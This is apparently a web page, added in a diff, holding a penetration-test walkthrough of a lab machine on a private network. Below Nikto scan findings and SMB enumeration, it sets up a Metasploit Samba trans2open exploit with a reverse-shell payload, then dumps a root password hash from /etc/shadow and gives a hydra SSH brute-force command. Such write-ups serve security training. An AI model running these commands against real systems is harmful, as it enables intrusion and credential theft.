+<p>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
+</li>
+<li>
+<p>mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</p>
+</li>
+<li>
+<p>Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</p>
+</li>
+<li>
+<p>OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.</p>
+</li>
+<li>
+<p>OSVDB-27487: Apache is vulnerable to XSS via the Expect header</p>
+</li>
+<li>
+<p>Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE</p>
+</li>
+<li>
+<p>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</p>
+</li>
+<li>
+<p>OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.</p>
+</li>
+<li>
+<p>OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</p>
+</li>
+<li>
+<p>OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.</p>
+</li>
+<li>
+<p>mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. , OSVDB-756.</p>
+</li>
+<li>
+<p>///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.</p>
+</li>
+<li>
+<p>OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).</p>
+</li>
+<li>
+<p>OSVDB-3268: /manual/: Directory indexing found.</p>
+</li>
+<li>
+<p>OSVDB-3092: /manual/: Web server manual found.</p>
+</li>
+<li>
+<p>OSVDB-3268: /icons/: Directory indexing found.</p>
+</li>
+<li>
+<p>OSVDB-3233: /icons/README: Apache default file found.</p>
+</li>
+<li>
+<p>OSVDB-3092: /test.php: This might be interesting...</p>
+</li>
+<li>
+<p>/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p>
+</li>
+<li>
+<p>/wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p>
+</li>
+<li>
+<p>/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p>
+</li>
+<li>
+<p>/wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p>
+</li>
+<li>
+<p>/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p>
+</li>
+<li>
+<p>/wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</p>
+</li>
+<li>
+<p>/assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.</p>
+</li>
+<li>
+<p>/login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.</p>
+</li>
+<li>
+<p>/shell?cat+/etc/hosts: A backdoor was identified.</p>
+</li>
+<li>
+<p>8724 requests: 0 error(s) and 30 item(s) reported on remote host</p>
+</li>
+<li>
+<p>End Time:               2022-08-01 05:14:52 (GMT-4) (40 seconds)</p>
+</li>
+</ul>
+<hr />
+<ul>
+<li>1 host(s) tested</li>
+</ul>
+<p>SMB ENUM:</p>
+<p>msf6 &gt; search smb_version</p>
+<p>Matching Modules</p>
+<p>================</p>
+<h1>Name                                   Disclosure Date  Rank        Check  Description</h1>
+<ul>
+<li>----                                   ---------------  ----        -----  -----------</li>
+</ul>
+<p>0  auxiliary/scanner/smb/smb_version                   normal  No         SMB Version Detection</p>
+<p>Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version</p>
+<p>msf6 &gt; use 0</p>
+<p>msf6 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.1.4</p>
+<p>RHOSTS =&gt; 192.168.1.4</p>
+<p>msf6 auxiliary(scanner/smb/smb_version) &gt; run</p>
+<p>[*] 192.168.1.4:139           - SMB Detected (versions:) (preferred dialect:) (signatures:optional)</p>
+<p>[*] 192.168.1.4:139           -   Host could not be identified: Unix (Samba 2.2.1a)</p>
+<p>[*] 192.168.1.4:              - Scanned 1 of 1 hosts (100% complete)</p>
+<p>[*] Auxiliary module execution completed</p>
+<p>smbclient -L</p>
+<p>Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set</p>
+<p>Anonymous login successful</p>
+<p>Password for [WORKGROUP\kali]:</p>
+<p>Sharename           Type          Comment</p>
+<p>---------           ----          -------</p>
+<p>IPC$                IPC           IPC Service (Samba Server)</p>
+<p>ADMIN$              IPC           IPC Service (Samba Server)</p>
+<p>smbclient</p>
+<p>Password for [WORKGROUP\kali]:</p>
+<p>Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set</p>
+<p>Anonymous login successful</p>
+<p>Try "help" to get a list of possible commands.</p>
+<p>smb: &gt; ls</p>
+<p>NT_STATUS_NETWORK_ACCESS_DENIED listing *</p>
+<p>Exploit</p>
+<p>msf exploit(linux/samba/trans2open) &gt; set RHOST192.168.1.14</p>
+<p>msf exploit(linux/samba/trans2open) &gt; set payload linux/x86/shell_reverse_tcp</p>
+<p>msf exploit(linux/samba/trans2open) &gt; set lhost 192.168.1.6</p>
+<p>msf exploit(linux/samba/trans2open) &gt; exploit</p>
+<p>manual exploit: openluck</p>
+<p>cat /etc/shadow</p>
+<p>root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::</p>
+<p>Crack password:</p>
+<p>hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://192.168.1.4:22 -t 4 -V</p>
+<p>or use ssh_login in msf</p>
+                </div>
+            </div>
+        </div>    
+    </body>
+    </html>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+<style>
+
+.copy-button {
+  position: absolute;
+  right: 5px ;
+  top: 5px;
+  border: transparent;
+  background-color: transparent;
+  padding: 2px 6px;
+  cursor: pointer;
+  font-size: 14px;
+  color: #333;
+  border-radius: 8px;
+
+}
+
+.copy-button:hover {
+  background-color: #30363d; # Change this to a different color to create a hover effect
+}
+.material-icons{
+  line-height:1.3;
+  color: #7d8590;
+}
+
+pre {
+  position: relative;
+  # padding: 20px;
+  border: 1px solid #e7ee7;
+  overflow-x: auto; # Remove this line to disable horizontal scrolling
+  font-size: 14px;
+  line-height: 1.5;
+  border-radius: 6px;
+  margin-bottom: 20px;
+
+  # Add these lines to set a fixed width for the code block and wrap long lines
+  #width: 80%;
+  white-space: pre-wrap; 
+}
+
+pre code {
+  display: block;
+  border-radius: 8px;
+  background-color: #2d2d2d; # Change this to a different color to match the copy button background
+
+}
+
+
+
+
+@media only screen and (min-width: 280px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and mobiles */
+  }
+}
+
+@media only screen and (max-width: 768px) {
+  img {
+    width: 85%; /* Make image smaller on tablets and desktops */
+  }
+}
+
+# @media (min-width: 576px) {
+#   img {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   img {
+#     max-width: 720px;
+#   }
+# }
+
+
+
+@media (min-width: 280px) {
+  .container {
+    max-width: 90%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+@media (min-width: 750px) {
+  .container {
+    max-width: 80%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+
+
+@media (min-width: 912px) {
+  .container {
+    max-width: 70%;
+    margin: 0 auto;
+    height: 100%;
+  }
+}
+
+# @media (min-width: 1200px) {
+#   .container {
+#     max-width: 70%;
+#     margin: 0 auto;
+#     height: 100%;
+#   }
+# }
+
+# @media (min-width: 576px) {
+#   .container {
+#     max-width: 540px;
+#   }
+# }
+
+# @media (min-width: 768px) {
+#   .container {
+#     max-width: 620px;
+#     margin: 0;
+#   }
+# }
+
+# @media (min-width: 992px) {
+#   .container {
+#     max-width: 760px;
+#   }
+# }
+
+@media (min-width: 1200px) {
+  .container {
+    max-width: 735px;
+    margin: 0;
+    height: 100%;
+  }
+}
+
+# p { 
+#   text-indent: 10px;
+# }
+
+h2 {
+  font-size: 1.5rem;
+}
+
+h3 {
+  font-size: 1.3rem;
+}
+
+# .container {
+#   max-width: 100%; /* Set the container width to 100% */
+#   padding-left: 15px; /* Add some padding to the left */
+#   padding-right: 15px; /* Add some padding to the right */
+# }
+
+
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/highlight.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark-reasonable.min.css">
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    var codeBlocks = document.querySelectorAll('pre code');
+    codeBlocks.forEach(function(codeBlock) {
+      var copyButton = document.createElement('button');
+      copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+      copyButton.classList.add('copy-button');
+      codeBlock.parentNode.insertBefore(copyButton, codeBlock);
+
+      copyButton.addEventListener('click', function() {
+        var code = codeBlock.textContent;
+        var textarea = document.createElement('textarea');
+        textarea.textContent = code;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        textarea.remove();
+        copyButton.innerHTML = '<i class="material-icons">check</i>';
+        setTimeout(function() {
+          copyButton.innerHTML = '<i class="material-icons">content_copy</i>';
+        }, 2000);
+      });
+    });
+
+    // Initialize highlight.js for syntax highlighting
+    hljs.initHighlightingOnLoad();
+  });
+</script>
